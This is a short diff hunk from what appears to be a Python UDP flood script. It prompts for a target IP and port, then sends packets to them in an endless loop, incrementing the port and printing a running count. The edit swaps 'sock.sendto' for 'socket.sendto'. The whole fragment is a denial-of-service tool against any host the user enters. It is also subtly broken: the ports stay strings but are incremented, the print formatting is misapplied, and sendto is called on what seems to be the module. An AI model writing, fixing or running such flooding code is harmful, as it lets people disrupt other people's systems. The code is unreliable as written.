@@ -25,7 +25,7 @@ ip = input("IP Target : ")
 port = input("Port     : ")
 
 while True:
-     sock.sendto(bytes, (ip,port))
+     socket.sendto(bytes, (ip,port))
      sent = sent + 1
      port = port + 1
      print("Sent %s packet to %s trought port:%s")%(sent,ip,port) 
